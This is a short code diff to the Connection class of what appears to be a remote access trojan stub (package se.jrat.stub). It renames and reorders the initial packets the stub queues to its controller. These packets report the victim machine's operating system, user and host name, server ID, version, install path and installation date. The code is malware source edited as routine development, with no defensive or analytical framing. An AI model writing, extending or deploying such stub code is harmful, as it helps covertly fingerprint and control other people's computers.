@@ -29,7 +29,7 @@ import se.jrat.stub.packets.outgoing.AbstractOutgoingPacket;
 import se.jrat.stub.packets.outgoing.Packet10InitDefaultLocale;
 import se.jrat.stub.packets.outgoing.Packet13Status;
 import se.jrat.stub.packets.outgoing.Packet15InitServerID;
-import se.jrat.stub.packets.outgoing.Packet16InitOperatingSystem;
+import se.jrat.stub.packets.outgoing.Packet4InitOperatingSystem;
 import se.jrat.stub.packets.outgoing.Packet1InitHandshake;
 import se.jrat.stub.packets.outgoing.Packet23InitInstallPath;
 import se.jrat.stub.packets.outgoing.Packet25InitJavaVersion;
@@ -147,13 +147,15 @@ public class Connection implements Runnable {
 	public static void initialize() throws Exception {
 		addToSendQueue(new Packet1InitHandshake());
 		
+		addToSendQueue(new Packet4InitOperatingSystem());
+		addToSendQueue(new Packet5InitUserHost());
+
+		
 		addToSendQueue(new Packet30InitVersion(Version.getVersion()));
 
-		addToSendQueue(new Packet16InitOperatingSystem());
 
 		addToSendQueue(new Packet15InitServerID(Main.getID()));
 
-		addToSendQueue(new Packet5InitUserHost());
 				
 		addToSendQueue(new Packet31InitInstallationDate(Configuration.date));
 
